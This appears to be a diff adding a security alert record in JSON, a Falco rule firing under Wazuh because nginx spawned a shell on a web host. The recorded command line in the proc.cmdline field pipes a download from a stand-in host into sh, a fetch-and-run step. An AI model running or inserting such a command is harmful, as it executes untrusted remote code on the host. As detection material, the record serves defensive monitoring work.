@@ -1,0 +1,18 @@
+{
+  "agent": {"ip": "10.0.7.18", "name": "web-edge-03", "id": "082"},
+  "manager": {"name": "wazuh.manager"},
+  "data": {
+    "rule_name": "Suspicious child of web server",
+    "proc.name": "sh",
+    "proc.cmdline": "sh -c \"curl -fsSL http://updates.example.io/x | sh\"",
+    "proc.pname": "nginx",
+    "proc.ppid": 1422,
+    "proc.pid": 31807,
+    "user.name": "www-data",
+    "user.uid": 33,
+    "container.id": "host",
+    "evt.type": "execve"
+  },
+  "rule": {"id": "100110", "level": 9, "description": "Falco: shell spawned as child of nginx worker"},
+  "timestamp": "2026-04-26T03:11:07.802+0000"
+}
